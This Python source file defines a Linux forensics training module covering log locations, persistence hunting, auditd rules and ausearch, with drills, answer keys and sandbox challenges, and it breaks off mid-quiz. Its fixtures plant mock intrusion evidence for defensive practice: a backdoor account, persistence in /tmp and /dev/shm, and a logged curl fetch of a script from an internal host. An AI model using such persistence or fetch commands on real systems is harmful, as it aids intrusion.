"""Linux DFIR: where the evidence is, and how to ask the audit log for it.

The roster had `dfirwin` for Windows and Sysmon and nothing at all for Linux,
which is a strange shape for a DFIR practitioner working on a Linux machine.
This is the other half.

**Two subjects, and they answer different questions.** Knowing *where things
live* answers "what happened on this box" from a filesystem you already have,
which is what triage is. `auditd` answers "what happened at the syscall level",
which is what you get only if somebody turned it on beforehand. Both matter,
and the first is the one you can always do.

**auditd is the Linux answer to Sysmon**, and the comparison is worth holding:
Sysmon watches process creation, network connections and file writes and
writes structured events; auditd watches syscalls and file paths and writes
flat text. Both are opt-in, both need rules written in advance, and both are
worth configuring before you need them rather than after.

**The rule syntax is the hard part and the whole point.** `-w path -p wa -k
key` watches a file. `-a always,exit -F arch=b64 -S execve -k key` watches a
syscall. Those two shapes cover most real rulesets, and the `-k` key is what
makes the log searchable afterwards, which is the difference between a log and
an archive.

**Verified where it honestly can be.** Writing rules and reading a log are
both offline work, and `ausearch -if FILE` queries a log file rather than the
live system, so those challenges run the real tool against a real audit log in
the sandbox. Collecting from a live machine and loading rules need root, so
they are self-marked and say so.
"""

MODULE = {
    'id': 'linuxdfir',
    'title': 'Linux DFIR',
    'group': 'Security',
    'blurb': 'Where Linux evidence lives, auditd rules, and querying the audit log.',
    'context': 'You are triaging a Linux host, or a copy of one, from a shell.',
    'needs': ['ausearch'],
    'prereqs': ['systemd', 'linuxadv'],
    'adapter': 'sandbox',
    'estimate': '4-5 hours',
    'order': 85,

    'lessons': [
        {
            'id': 'ld-artifacts',
            'title': 'Where the evidence lives',
            'next': 'ld-persistence',
            'concept': (
                'Triage on Linux starts with knowing which files answer which '
                'question, because most of what you need is already on the '
                'disk whether or not anyone configured logging.\n\n'
                '**Who logged in.** `/var/log/auth.log` on Debian, '
                '`/var/log/secure` on RHEL, and the journal everywhere with '
                'systemd. `last` reads `/var/log/wtmp` for successful logins '
                'and `lastb` reads `/var/log/btmp` for failed ones. `lastlog` '
                'shows the most recent login per account, which is how you '
                'spot an account that has never been used suddenly being '
                'used.\n\n'
                '**Who exists.** `/etc/passwd` for accounts, `/etc/shadow` for '
                'whether they have a password at all, `/etc/group` for who is '
                'in `sudo` or `wheel`, and `/etc/sudoers` plus '
                '`/etc/sudoers.d/` for who can become root. An account with UID '
                '0 that is not `root` is worth noticing immediately.\n\n'
                '**What ran.** Shell histories, `~/.bash_history` and its '
                'friends, which are unreliable (no timestamps by default, '
                'trivially edited, only written on clean exit) and still '
                'frequently the most useful file on the box. The journal, per '
                'the systemd module. And auditd, if it was on.\n\n'
                '**What is running now**, if the machine is live: `ps auxf` for '
                'the process tree, `ss -tulpn` for listening sockets and who '
                'owns them, `lsof -p PID` for what a process has open.\n\n'
                'The habit that matters: **copy before you read** where you '
                'can, and record what you did. Reading a live filesystem '
                'changes access times, and access times may be the thing you '
                'later wish you had.'
            ),
            'examples': [
                {
                    'label': 'The first four questions',
                    'code': ('last -f wtmp                 who logged in\n'
                             'lastb -f btmp                who failed to\n'
                             'awk -F: \'$3==0\' passwd       who is root\n'
                             'grep -r "" sudoers.d/         who can become root'),
                    'note': 'A second account with UID 0 is not a subtlety. '
                            'Check it before anything clever.',
                },
                {
                    'label': 'On a live host, before it changes',
                    'code': ('ps auxf                      the process tree\n'
                             'ss -tulpn                    listening, with owner\n'
                             'lsof -p 1234                 what it has open\n'
                             'ls -l /proc/1234/exe         what it really is\n'
                             '\n'
                             'the exe link survives a deleted binary'),
                    'note': '/proc/PID/exe still points at a binary that has '
                            'been unlinked, and says (deleted), which is a '
                            'strong signal on its own.',
                },
            ],
            'misconceptions': [
                'Shell history is not a log. It has no timestamps unless '
                '`HISTTIMEFORMAT` was set, it is written on clean exit so a '
                'killed shell leaves none, and anyone can edit it. Useful, '
                'never authoritative.',
                'An empty `/var/log/auth.log` does not mean nothing happened. '
                'It may mean the machine uses the journal, or that something '
                'truncated it, and those are different findings.',
                'Reading a live filesystem is not free. It updates access '
                'times, so copy first where you can and note what you touched '
                'where you cannot.',
            ],
            'try_it': [
                'Run `last -n 20` and `lastb -n 20` on your own machine and '
                'compare what each knows.',
                'Run `awk -F: \'$3 == 0 {print $1}\' /etc/passwd`. It should '
                'print exactly one name.',
            ],
        },
        {
            'id': 'ld-persistence',
            'title': 'The places something arranges to come back',
            'next': 'ld-auditd',
            'concept': (
                'Anything that wants to survive a reboot has to write itself '
                'somewhere the machine reads at startup, and the list of such '
                'places is finite. That is what makes persistence hunting '
                'tractable: you are not searching, you are checking a '
                'list.\n\n'
                '**systemd** is first now, because it is where most persistence '
                'lives on a modern box: unit files in '
                '`/etc/systemd/system/`, in `/usr/lib/systemd/system/`, and in '
                'the per-user `~/.config/systemd/user/`. Timers alongside them. '
                'A unit whose `ExecStart` points into `/tmp`, `/dev/shm` or a '
                'home directory is worth a hard look, as is one whose name '
                'imitates something familiar.\n\n'
                '**cron** remains: `/etc/crontab`, `/etc/cron.d/`, the '
                '`cron.daily` and friends directories, and per-user crontabs '
                'under `/var/spool/cron/`. `@reboot` entries are startup '
                'persistence that looks like scheduling.\n\n'
                '**Shell startup files**, which are per-user and often '
                'overlooked: `~/.bashrc`, `~/.bash_profile`, `~/.profile`, and '
                'the system-wide `/etc/profile` and `/etc/profile.d/`.\n\n'
                '**SSH**: an extra key in `~/.ssh/authorized_keys` is quiet, '
                'durable access that survives a password change, and a '
                '`command=` prefix on such a key runs something on every '
                'connection.\n\n'
                '**Setuid binaries**, which are privilege rather than startup, '
                'but belong to the same sweep: `find / -perm -4000` and be '
                'suspicious of anything outside the usual short list.\n\n'
                'The workflow is the same each time: enumerate the locations, '
                'sort by modification time, and read the recent end.'
            ),
            'examples': [
                {
                    'label': 'The sweep, in order of likelihood',
                    'code': ('systemd  /etc/systemd/system/*.service *.timer\n'
                             '         ~/.config/systemd/user/\n'
                             'cron     /etc/cron.d/  /var/spool/cron/\n'
                             'shell    ~/.bashrc  /etc/profile.d/\n'
                             'ssh      ~/.ssh/authorized_keys\n'
                             'setuid   find / -perm -4000 -type f'),
                    'note': 'A finite list, which is why this is checkable '
                            'rather than open-ended.',
                },
                {
                    'label': 'Sort by time and read the new end',
                    'code': ('find etc/systemd etc/cron.d -type f \\\n'
                             '  -printf "%T@ %p\\n" | sort -n | tail\n'
                             '\n'
                             'grep -rl "/tmp\\|/dev/shm" etc/systemd/'),
                    'note': 'Newest last. A unit or job written minutes after '
                            'an intrusion is the thing you are looking for.',
                },
            ],
            'misconceptions': [
                'Persistence is not always a service. A line in `~/.bashrc` '
                'runs every time that user opens a shell, and nothing about it '
                'appears in `systemctl` output.',
                'An extra `authorized_keys` entry survives a password reset and '
                'a password policy. Rotating the password does nothing about '
                'it.',
                'A unit file in `/etc/systemd/system/` overrides the vendor one '
                'of the same name, so persistence can hide as a legitimate '
                'service name rather than a suspicious new one.',
            ],
            'try_it': [
                'List every unit file under `/etc/systemd/system/` on your own '
                'machine and confirm you can account for each one.',
                'Run `find / -perm -4000 -type f 2>/dev/null` and read the '
                'list. It should be short and boring.',
            ],
        },
        {
            'id': 'ld-auditd',
            'title': 'auditd: rules you write before you need them',
            'next': 'ld-ausearch',
            'concept': (
                'auditd records kernel events against rules you supplied in '
                'advance. Nothing is recorded that no rule asked for, which is '
                'why the ruleset is the whole design, and why an empty audit '
                'log usually means nobody configured it rather than nothing '
                'happened.\n\n'
                'There are two rule shapes and between them they cover most '
                'real configurations.\n\n'
                'A **file watch** is `-w /etc/shadow -p wa -k shadow_access`. '
                '`-w` is the path, `-p` is the permissions to care about (`r` '
                'read, `w` write, `x` execute, `a` attribute change), and `-k` '
                'is a key you invent.\n\n'
                'A **syscall rule** is `-a always,exit -F arch=b64 -S execve -k '
                'exec`. `-a always,exit` means record it when the syscall '
                'returns, `-F` adds a filter, and `-S` names the syscall. The '
                '`arch=b64` filter matters more than it looks: rules are '
                'per-architecture, so a b64-only rule misses 32-bit binaries '
                'entirely, and real rulesets list both.\n\n'
                '**The key is the important habit.** `-k` costs nothing at '
                'write time and is the difference between a searchable log and '
                'a pile of syscalls, because every query later starts with '
                '`ausearch -k`.\n\n'
                'Rules live in `/etc/audit/rules.d/*.rules`, are compiled into '
                '`audit.rules` by `augenrules --load`, and `auditctl -l` shows '
                'what is actually loaded now. `auditctl` also loads rules '
                'immediately and they are lost at reboot, which is the usual '
                'reason a rule "stopped working".\n\n'
                'One rule deserves special mention: `-e 2` makes the '
                'configuration immutable until reboot. On a machine you care '
                'about that is the line that stops an intruder simply turning '
                'the auditing off.'
            ),
            'examples': [
                {
                    'label': 'The two shapes',
                    'code': ('-w /etc/shadow -p wa -k shadow_access\n'
                             '-w /etc/sudoers -p wa -k sudo_change\n'
                             '\n'
                             '-a always,exit -F arch=b64 -S execve -k exec\n'
                             '-a always,exit -F arch=b64 -S connect -k net\n'
                             '-a always,exit -F arch=b64 -F euid=0 -S execve \\\n'
                             '   -k root_exec'),
                    'note': 'Watches are for paths, syscall rules are for '
                            'behaviour. Both take -k, and both should.',
                },
                {
                    'label': 'Loading, listing, locking',
                    'code': ('auditctl -l                   what is loaded now\n'
                             'auditctl -w /etc/passwd -p wa -k users\n'
                             'augenrules --load             from rules.d\n'
                             'auditctl -s                   status and backlog\n'
                             '\n'
                             '-e 2                          immutable to reboot'),
                    'note': 'auditctl rules vanish at reboot. Anything you want '
                            'to keep goes in /etc/audit/rules.d/.',
                },
            ],
            'misconceptions': [
                'auditd records nothing by default. An empty log is almost '
                'always an unconfigured ruleset rather than a quiet machine.',
                'Rules are per-architecture. A rule with only `arch=b64` misses '
                '32-bit binaries, which is why real rulesets carry both b32 and '
                'b64 versions of the same rule.',
                'Rules loaded with `auditctl` do not survive a reboot. Only '
                'files in `/etc/audit/rules.d/` do, and `augenrules --load` is '
                'what applies them.',
            ],
            'try_it': [
                'Run `auditctl -l` on your machine. On most desktops it says '
                '"No rules", which is the point being made.',
                'Read `/etc/audit/rules.d/` if it exists and see whether anyone '
                'has configured anything.',
            ],
        },
        {
            'id': 'ld-ausearch',
            'title': 'Querying the audit log',
            'concept': (
                'The audit log is flat text and deeply unfriendly to read '
                'directly: numeric UIDs, hex-encoded arguments, and one event '
                'split across several `type=` lines that share an event id. '
                '`ausearch` exists to reassemble and translate that, and using '
                'it is much easier than reading the raw file.\n\n'
                'The filters are the same shape as any query tool. `-k` is the '
                'key you set in the rule, and is the first thing to reach for. '
                '`-f /etc/shadow` searches by file, `-x /usr/bin/curl` by '
                'executable, `-p 1234` by process id, `-m EXECVE` by record '
                'type. `-ts` and `-te` bound the time, and take friendly words: '
                '`-ts today`, `-ts recent`, `-ts 08/13/2025 10:00:00`.\n\n'
                '**`-i` is the flag to always add.** It interprets: numeric '
                'UIDs become names, timestamps become dates, and hex-encoded '
                'arguments become readable strings. Without it you are reading '
                'raw fields for no reason.\n\n'
                '**`-if FILE` reads a log file rather than the live system**, '
                'which is what makes this usable on a collected artifact and '
                'not just on the machine itself. That is the whole difference '
                'between a live-response tool and a forensics tool.\n\n'
                'The field to understand is **`auid`**, the audit user id, also '
                'called the loginuid. It is set when a session begins and does '
                'not change when the user becomes someone else, so a process '
                'running with `uid=0` and `auid=1000` is root now and was '
                'alice when the session started. That single field is how you '
                'attribute a root action to a person, and it is the reason the '
                'audit log answers questions the process table cannot.\n\n'
                '`aureport` is the summary side: `--summary`, `--auth`, '
                '`--executable`, `-x`, all taking the same `-if`.'
            ),
            'examples': [
                {
                    'label': 'Query by what you know',
                    'code': ('ausearch -k shadow_access -i\n'
                             'ausearch -f /etc/shadow -i\n'
                             'ausearch -x /usr/bin/curl -i\n'
                             'ausearch -ua 1000 -ts today -i\n'
                             '\n'
                             'ausearch -if audit.log -k exec -i'),
                    'note': '-i interprets and -if reads a file. Those two '
                            'flags turn it from unreadable to usable.',
                },
                {
                    'label': 'auid is the field that attributes',
                    'code': ('uid=0 auid=1000\n'
                             '  root now, alice when the session started\n'
                             '\n'
                             'ausearch -ua 1000 -i    everything alice did,\n'
                             '                        including as root\n'
                             '\n'
                             'auid=4294967295         no login session (a\n'
                             '                        daemon, not a person)'),
                    'note': 'The loginuid survives su and sudo, which is '
                            'exactly why it is the one to search on.',
                },
            ],
            'misconceptions': [
                'One event is several lines. A SYSCALL, an EXECVE and one or '
                'more PATH records share an event id, and `ausearch` groups '
                'them; grepping the raw file gives you fragments.',
                '`auid` is not `uid`. The audit uid is the identity the session '
                'started with and does not change with su or sudo, which makes '
                'it the field that attributes an action to a person.',
                '`auid=4294967295` (unset) means no login session was '
                'associated, which usually means a system daemon rather than '
                'anything suspicious.',
            ],
            'try_it': [
                'On a machine with auditing on, run `ausearch -m USER_LOGIN -i '
                '-ts today` and read the interpreted output.',
                'Compare `ausearch -k something` with `grep something '
                '/var/log/audit/audit.log` and see what the grouping gives '
                'you.',
            ],
        },
    ],

    'drills': [
        {'id': 'ldd-last', 'type': 'command', 'answer': 'last -f wtmp',
         'prompt': 'Read successful logins from a collected wtmp file.',
         'teach': 'last reads wtmp and lastb reads btmp. On a collected '
                  'artifact you point them at the file with -f.'},
        {'id': 'ldd-lastb', 'type': 'command', 'answer': 'lastb -f btmp',
         'prompt': 'Read failed login attempts from a collected btmp file.',
         'teach': 'A burst of failures followed by one success is the shape '
                  'worth noticing.'},
        {'id': 'ldd-uid0', 'type': 'command',
         'answer': "awk -F: '$3 == 0 {print $1}' /etc/passwd",
         'prompt': 'List every account with UID 0.',
         'teach': 'Should print exactly root. A second UID 0 account is a '
                  'finding, not a subtlety.'},
        {'id': 'ldd-nologin', 'type': 'command',
         'answer': "awk -F: '$7 !~ /nologin|false/ {print $1}' /etc/passwd",
         'prompt': 'List accounts that have a real login shell.',
         'teach': 'A service account that suddenly has a shell is worth '
                  'explaining.'},
        {'id': 'ldd-setuid', 'type': 'command',
         'answer': 'find / -perm -4000 -type f 2>/dev/null',
         'prompt': 'Find every setuid binary on the filesystem.',
         'teach': 'The list should be short and familiar. Anything outside the '
                  'usual set is worth a hard look.'},
        {'id': 'ldd-authkeys', 'type': 'command',
         'answer': 'find /home -name authorized_keys -exec cat {} +',
         'prompt': 'Read every SSH authorized_keys under the home directories.',
         'teach': 'An extra key is quiet access that survives a password '
                  'change, so rotating the password does nothing about it.'},
        {'id': 'ldd-recent-units', 'type': 'command',
         'answer': 'find /etc/systemd/system -type f -printf "%T@ %p\\n" | sort -n | tail',
         'prompt': 'List unit files newest last, by modification time.',
         'teach': 'Persistence is usually the newest thing in a directory of '
                  'otherwise old files.'},
        {'id': 'ldd-watch', 'type': 'command',
         'answer': 'auditctl -w /etc/shadow -p wa -k shadow_access',
         'prompt': 'Watch a file for writes and attribute changes, with a key.',
         'teach': '-p takes r, w, x and a. The -k key is what every later '
                  'ausearch query starts from.'},
        {'id': 'ldd-syscall', 'type': 'command',
         'answer': 'auditctl -a always,exit -F arch=b64 -S execve -k exec',
         'prompt': 'Record every 64-bit process execution, with a key.',
         'teach': 'Rules are per-architecture, so a real ruleset carries the '
                  'b32 version of this line too.'},
        {'id': 'ldd-auditctl-l', 'type': 'command', 'answer': 'auditctl -l',
         'prompt': 'List the audit rules loaded right now.',
         'teach': 'On most desktops this says "No rules", which is why an '
                  'empty audit log usually means unconfigured.'},
        {'id': 'ldd-augenrules', 'type': 'command', 'answer': 'augenrules --load',
         'prompt': 'Load the persistent rules from the rules directory.',
         'teach': 'auditctl rules vanish at reboot. Only /etc/audit/rules.d/ '
                  'survives, and this is what applies it.'},
        {'id': 'ldd-immutable', 'type': 'command', 'answer': 'auditctl -e 2',
         'prompt': 'Lock the audit configuration until the next reboot.',
         'teach': 'The line that stops an intruder simply turning auditing off. '
                  'It also stops you changing rules, deliberately.'},
        {'id': 'ldd-ausearch-key', 'type': 'command',
         'answer': 'ausearch -k shadow_access -i',
         'prompt': 'Find every audit event carrying one rule key, interpreted.',
         'teach': '-i turns numeric UIDs into names and hex arguments into '
                  'strings. Always add it.'},
        {'id': 'ldd-ausearch-file', 'type': 'command',
         'answer': 'ausearch -if audit.log -k exec -i',
         'prompt': 'Query a collected audit log file rather than the live one.',
         'teach': '-if is what makes this a forensics tool rather than only a '
                  'live-response one.'},
        {'id': 'ldd-ausearch-auid', 'type': 'command',
         'answer': 'ausearch -ua 1000 -i',
         'prompt': 'Find everything one login session did, including as root.',
         'teach': 'The audit uid survives su and sudo, so this attributes root '
                  'actions to the person who logged in.'},
        {'id': 'ldd-ausearch-exe', 'type': 'command',
         'answer': 'ausearch -x /usr/bin/curl -i',
         'prompt': 'Find every audit event for one executable.',
         'teach': 'Pairs with an execve rule: the rule records it, this finds '
                  'it.'},
        {'id': 'ldd-aureport', 'type': 'command',
         'answer': 'aureport -if audit.log --summary',
         'prompt': 'Summarise a collected audit log rather than querying it.',
         'teach': 'aureport is the overview side, and takes the same -if. '
                  '--auth and --executable are the other useful two.'},
        {'id': 'ldd-proc-exe', 'type': 'command', 'answer': 'ls -l /proc/1234/exe',
         'prompt': 'Find the real binary behind a running process id.',
         'teach': 'Still points at the file after it has been unlinked, and '
                  'says (deleted), which is a strong signal by itself.'},
    ],

    'challenges': [
        {
            'id': 'ldc-triage',
            'title': 'Triage a collected filesystem',
            'goal': 'A copy of the parts of a host that matter. Answer the '
                    'first three questions of any Linux triage from it.',
            'setup': {'kind': 'sandbox', 'shell': 'bash', 'tree': {
                'etc/passwd':
                    'root:x:0:0:root:/root:/bin/bash\n'
                    'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n'
                    'alice:x:1000:1000:Alice:/home/alice:/bin/bash\n'
                    'backup:x:1001:1001:Backup:/var/backups:/usr/sbin/nologin\n'
                    'svcmon:x:0:0:Monitoring:/opt/mon:/bin/bash\n',
                'etc/group':
                    'root:x:0:\nsudo:x:27:alice,svcmon\nusers:x:100:alice\n',
                'etc/sudoers.d/90-cloud':
                    'alice ALL=(ALL) NOPASSWD:ALL\n',
                'etc/sudoers.d/99-mon':
                    'svcmon ALL=(ALL) NOPASSWD:ALL\n',
                'home/alice/.ssh/authorized_keys':
                    'ssh-ed25519 AAAAC3NzaC1lZDI1 alice@laptop\n'
                    'ssh-ed25519 AAAAC3NzaC1lZDI2 backup@nas\n',
            }},
            'solution': {'shell':
                "awk -F: '$3 == 0 {print $1}' etc/passwd > uid0.txt && "
                "awk -F: '$7 !~ /nologin|false/ {print $1}' etc/passwd "
                "> shells.txt && "
                'grep -rh "NOPASSWD" etc/sudoers.d/ | awk \'{print $1}\' '
                '| sort > nopasswd.txt && '
                'wc -l < home/alice/.ssh/authorized_keys > keycount.txt'},
            'steps': [
                {'instruction': 'Write uid0.txt listing every account with UID '
                                '0. There should be one. There is not.',
                 'hint': "awk -F: '$3 == 0 {print $1}' etc/passwd"},
                {'instruction': 'Write shells.txt listing accounts with a real '
                                'login shell, so you can see which service '
                                'accounts can log in.',
                 'hint': "awk -F: '$7 !~ /nologin|false/'"},
                {'instruction': 'Write nopasswd.txt listing every account that '
                                'can become root without a password, sorted.',
                 'hint': 'grep -rh NOPASSWD etc/sudoers.d/ then take field 1'},
                {'instruction': 'Count the authorized_keys entries for alice '
                                'into keycount.txt. Two keys on a single-user '
                                'laptop is a question.',
                 'hint': 'wc -l < home/alice/.ssh/authorized_keys'},
                {'instruction': 'Put it together: an extra UID 0 account, with '
                                'a shell, with passwordless sudo, is not three '
                                'findings. It is one.'},
            ],
            'free': 'From the collected tree produce uid0.txt, shells.txt, '
                    'nopasswd.txt and keycount.txt answering who is root, who '
                    'can log in, who can become root without a password, and '
                    'how many SSH keys alice trusts.',
            'verify': {'kind': 'sandbox', 'expect': {
                'file_contains': {'uid0.txt': ['root', 'svcmon'],
                                  'shells.txt': ['alice', 'svcmon'],
                                  'nopasswd.txt': ['alice', 'svcmon'],
                                  'keycount.txt': '2'},
                'file_lacks': {'shells.txt': 'daemon'}}},
            'fallback': 'self',
        },
        {
            'id': 'ldc-persistence',
            'title': 'Find where it arranged to come back',
            'goal': 'Persistence is a finite list of locations. Check the list '
                    'rather than searching, and find the two that are wrong.',
            'setup': {'kind': 'sandbox', 'shell': 'bash', 'tree': {
                'etc/systemd/system/nginx-helper.service':
                    '[Unit]\nDescription=nginx helper\n\n'
                    '[Service]\nType=simple\n'
                    'ExecStart=/tmp/.cache/helper\nRestart=always\n\n'
                    '[Install]\nWantedBy=multi-user.target\n',
                'etc/systemd/system/logrotate.service':
                    '[Unit]\nDescription=Rotate log files\n\n'
                    '[Service]\nType=oneshot\n'
                    'ExecStart=/usr/sbin/logrotate /etc/logrotate.conf\n',
                'etc/cron.d/backup':
                    '0 3 * * * root /usr/local/bin/backup.sh\n',
                'etc/cron.d/mailer':
                    '@reboot root /dev/shm/.m/run\n',
                'home/alice/.bashrc':
                    'export PS1="\\u@\\h \\w$ "\nalias ll="ls -l"\n',
            }},
            'solution': {'shell':
                'grep -rl "/tmp\\|/dev/shm" etc/ > suspect.txt && '
                'grep -rh "^@reboot" etc/cron.d/ > reboot.txt && '
                'grep -rh "ExecStart=" etc/systemd/system/ | sort '
                '> execstarts.txt'},
            'steps': [
                {'instruction': 'Write suspect.txt listing every file under '
                                'etc/ that references a world-writable '
                                'directory. Nothing legitimate starts from '
                                '/tmp or /dev/shm.',
                 'hint': 'grep -rl "/tmp\\|/dev/shm" etc/'},
                {'instruction': 'Write reboot.txt holding any cron entry that '
                                'runs at boot. @reboot is startup persistence '
                                'dressed as scheduling.',
                 'hint': 'grep -rh "^@reboot" etc/cron.d/'},
                {'instruction': 'Write execstarts.txt with every ExecStart line '
                                'from the unit files, sorted, so you can read '
                                'the paths side by side.',
                 'hint': 'grep -rh "ExecStart=" etc/systemd/system/ | sort'},
                {'instruction': 'Notice the name of the bad unit. It imitates '
                                'something familiar, which is the point: a unit '
                                'called nginx-helper reads as infrastructure.'},
            ],
            'free': 'From the collected tree produce suspect.txt (files '
                    'referencing /tmp or /dev/shm), reboot.txt (@reboot cron '
                    'entries), and execstarts.txt (every ExecStart line, '
                    'sorted).',
            'verify': {'kind': 'sandbox', 'expect': {
                'file_contains': {'suspect.txt': ['nginx-helper.service',
                                                  'mailer'],
                                  'reboot.txt': '/dev/shm',
                                  'execstarts.txt': ['/tmp/.cache/helper',
                                                     '/usr/sbin/logrotate']},
                'file_lacks': {'suspect.txt': 'logrotate.service'}}},
            'fallback': 'self',
        },
        {
            'id': 'ldc-ausearch',
            'title': 'Attribute a root action to a person',
            'goal': 'Query a collected audit log with the real tool, and use '
                    'the one field that survives sudo.',
            'setup': {'kind': 'sandbox', 'shell': 'bash', 'tree': {
                'audit.log':
                    'type=SYSCALL msg=audit(1755120000.123:401): arch=c000003e '
                    'syscall=59 success=yes exit=0 a0=55f0 a1=55f1 a2=55f2 a3=0 '
                    'items=2 ppid=1200 pid=1201 auid=1000 uid=0 gid=0 euid=0 '
                    'suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=3 '
                    'comm="useradd" exe="/usr/sbin/useradd" key="user_mgmt"\n'
                    'type=EXECVE msg=audit(1755120000.123:401): argc=3 '
                    'a0="useradd" a1="-m" a2="backdoor"\n'
                    'type=SYSCALL msg=audit(1755120100.456:402): arch=c000003e '
                    'syscall=257 success=yes exit=3 a0=ffffff9c a1=7ffd a2=0 '
                    'a3=0 items=1 ppid=1300 pid=1301 auid=1000 uid=0 gid=0 '
                    'euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 '
                    'ses=3 comm="cat" exe="/usr/bin/cat" key="shadow_access"\n'
                    'type=PATH msg=audit(1755120100.456:402): item=0 '
                    'name="/etc/shadow" inode=1234 dev=fd:00 mode=0100640 '
                    'ouid=0 ogid=0 rdev=00:00 nametype=NORMAL\n'
                    'type=SYSCALL msg=audit(1755120200.789:403): arch=c000003e '
                    'syscall=59 success=yes exit=0 a0=aaa1 a1=aaa2 a2=aaa3 a3=0 '
                    'items=2 ppid=1400 pid=1401 auid=1001 uid=1001 gid=1001 '
                    'euid=1001 suid=1001 fsuid=1001 egid=1001 sgid=1001 '
                    'fsgid=1001 tty=pts1 ses=4 comm="curl" exe="/usr/bin/curl" '
                    'key="net_tools"\n'
                    'type=EXECVE msg=audit(1755120200.789:403): argc=3 '
                    'a0="curl" a1="-fsSL" a2="http://10.0.0.9/p.sh"\n',
            }},
            'solution': {'shell':
                'ausearch -if audit.log -k shadow_access -i > shadow.txt '
                '2>/dev/null; '
                'ausearch -if audit.log -ua 1000 -i > auid1000.txt 2>/dev/null; '
                'ausearch -if audit.log -x /usr/bin/curl -i > curl.txt '
                '2>/dev/null; true'},
            'steps': [
                {'instruction': 'Query the collected log for the shadow_access '
                                'key, interpreted, into shadow.txt. Note -if '
                                'reads the file rather than the live system.',
                 'hint': 'ausearch -if audit.log -k shadow_access -i > '
                         'shadow.txt'},
                {'instruction': 'Pull everything done by login session 1000 '
                                'into auid1000.txt. That is the audit uid, not '
                                'the uid.',
                 'hint': 'ausearch -if audit.log -ua 1000 -i > auid1000.txt'},
                {'instruction': 'Read it: uid is 0 and auid is 1000, so those '
                                'root actions belong to the person who logged '
                                'in as 1000. That is the attribution the '
                                'process table cannot give you.'},
                {'instruction': 'Pull every event for the curl binary into '
                                'curl.txt, and read the URL it fetched.',
                 'hint': 'ausearch -if audit.log -x /usr/bin/curl -i'},
            ],
            'free': 'From audit.log produce shadow.txt (the shadow_access '
                    'events), auid1000.txt (everything login session 1000 did), '
                    'and curl.txt (every event for /usr/bin/curl), all '
                    'interpreted.',
            'verify': {'kind': 'sandbox', 'expect': {
                'file_contains': {'shadow.txt': '/etc/shadow',
                                  'auid1000.txt': ['useradd', 'backdoor'],
                                  'curl.txt': '10.0.0.9'},
                'file_lacks': {'curl.txt': 'useradd'}}},
            'fallback': 'self',
        },
        {
            'id': 'ldc-own-host',
            'title': 'Sweep a machine you own',
            'goal': 'The collected trees above were small and tidy. A real host '
                    'is neither, and the trainer cannot stand in for one.',
            'setup': {'kind': 'self'},
            'steps': [
                {'instruction': 'Check the account questions on your own '
                                'machine: UID 0, login shells, sudoers, '
                                'authorized_keys.',
                 'hint': "awk -F: '$3 == 0' /etc/passwd"},
                {'instruction': 'Walk the persistence list: unit files, timers, '
                                'cron directories, shell startup files.'},
                {'instruction': 'Sort each location by modification time and '
                                'read the newest few. Account for anything you '
                                'do not recognise.'},
                {'instruction': 'Run `auditctl -l`. If it says no rules, decide '
                                'now which two or three rules you would want to '
                                'have had, and write them in '
                                '/etc/audit/rules.d/.'},
                {'instruction': 'Run `find / -perm -4000 -type f 2>/dev/null` '
                                'and confirm every entry is one you expect.'},
            ],
            'free': 'On your own machine: run the account checks, walk the '
                    'persistence locations newest-first, list setuid binaries, '
                    'and decide what audit rules you wish were already '
                    'loaded.',
            'verify': {'kind': 'self'},
            'fallback': 'self',
        },
    ],

    'quiz': [
        {'id': 'ldq-auid', 'type': 'mcq',
         'prompt': 'An audit event shows uid=0 and auid=1000. What does that '
                   'tell you?',
         'answer': 'The action ran as root, in a session that began as user '
                   '1000, so it is attributable to that person.',
         'distractors': ['The process changed its uid to hide.',
                         'The event was recorded twice, once per identity.',
                         'auid is the parent process owner.'],
         'teach': 'The loginuid is set at session start and survives su and '
                  'sudo, which is why it is the field that attributes.'},
        {'id': 'ldq-empty', 'type': 'mcq',
         'prompt': 'The audit log on a host is empty. What is the likely '
                   'reason?',
         'answer': 'No rules were configured, so nothing was ever recorded.',
         'distractors': ['The log was cleared by an intruder.',
                         'auditd only records failed operations.',
                         'The log rotated and the old one was deleted.'],
         'teach': 'auditd records only what a rule asked for. Check auditctl '
                  '-l before concluding anything about the machine.'},
        {'id': 'ldq-arch', 'type': 'mcq',
         'prompt': 'Why do real audit rulesets list the same rule twice with '
                   'arch=b32 and arch=b64?',
         'answer': 'Rules are per-architecture, so a b64-only rule misses '
                   '32-bit binaries entirely.',
         'distractors': ['To record both the syscall entry and its exit.',
                         'One covers the kernel and one covers user space.',
                         'It doubles the log detail for forensics.'],
         'teach': 'A 32-bit binary on a 64-bit host is exactly the gap this '
                  'closes, and it is easy to leave open.'},
        {'id': 'ldq-persist', 'type': 'mcq',
         'prompt': 'Which persistence location leaves nothing in systemctl '
                   'output?',
         'answer': 'A line in a user\'s ~/.bashrc, which runs whenever that '
                   'user opens a shell.',
         'distractors': ['A unit file in /etc/systemd/system/.',
                         'A timer paired with a service.',
                         'A user unit under ~/.config/systemd/user/.'],
         'teach': 'Shell startup files, cron and authorized_keys are all '
                  'outside systemd, which is why the sweep is a list rather '
                  'than one command.'},
        {'id': 'ldq-authkeys', 'type': 'mcq',
         'prompt': 'Why does an extra authorized_keys entry matter more than a '
                   'weak password?',
         'answer': 'It survives a password change, so the usual response does '
                   'nothing about it.',
         'distractors': ['It grants root regardless of the account.',
                         'It cannot be removed without reinstalling sshd.',
                         'It disables password authentication entirely.'],
         'teach': 'A `command=` prefix on such a key also runs something on '
                  'every connection, which is quieter still.'},
        {'id': 'ldq-history', 'type': 'mcq',
         'prompt': 'How much weight should you put on ~/.bash_history?',
         'answer': 'Useful but never authoritative: no timestamps by default, '
                   'written on clean exit, and trivially edited.',
         'distractors': ['Authoritative, because the shell writes it directly.',
                         'None, because it is always cleared by intruders.',
                         'Authoritative only if HISTTIMEFORMAT was unset.'],
         'teach': 'A killed shell leaves none at all, which is itself worth '
                  'noticing rather than reading as innocence.'},
        {'id': 'ldq-if', 'type': 'mcq',
         'prompt': 'What does `ausearch -if audit.log` do?',
         'answer': 'Queries that log file instead of the live system, which is '
                   'what makes it usable on a collected artifact.',
         'distractors': ['Filters the live log to entries about that file.',
                         'Imports the file into the running audit daemon.',
                         'Writes its output to that file.'],
         'teach': 'The difference between a live-response tool and a forensics '
                  'one. aureport takes the same flag.'},
        {'id': 'ldq-grep', 'type': 'mcq',
